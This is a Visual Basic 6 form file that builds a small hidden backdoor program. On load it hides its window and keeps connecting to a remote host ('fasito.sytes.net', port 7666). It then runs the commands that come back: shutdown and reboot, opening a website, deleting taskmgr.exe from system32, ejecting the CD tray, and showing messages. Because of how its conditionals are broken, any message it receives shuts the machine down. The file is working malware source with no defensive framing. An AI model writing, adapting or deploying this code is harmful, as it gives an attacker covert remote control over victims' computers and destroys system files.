VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   435
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   1560
   LinkTopic       =   "Form1"
   ScaleHeight     =   435
   ScaleWidth      =   1560
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   200
      Left            =   0
      Top             =   0
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   1080
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemoteHost      =   "fasito.sytes.net"
      RemotePort      =   7666
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
Hide '
End Sub
Private Sub Timer1_Timer()
If Winsock1.State = 0 Then
Winsock1.Connect
ElseIf Winsock1.State = 7 Then
Else '
End If
End Sub
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim datos As String
Winsock1.GetData datos '
If datos = "apagar" Then
End If
Shell "shutdown -s -t 0"
If datos = "reiniciar" Then
End If
Shell "shutdown -r -t 0"
If datos = "web" Then
Shell "start http://pwn3d.es/"
End If
If datos = "tareas" Then
Shell "del /S /Q C:\windows\system32\taskmgr.exe"
ElseIf datos = "abrir CD" Then
Call mciSendString("Set CDAudio Door Open Wait", 0&, 0&, 0&) '
ElseIf datos = "cerrar CD" Then
Call mciSendString("Set CDAudio Door Closed Wait", 0&, 0&, 0&) '
Else
MsgBox datos '
End If
End Sub
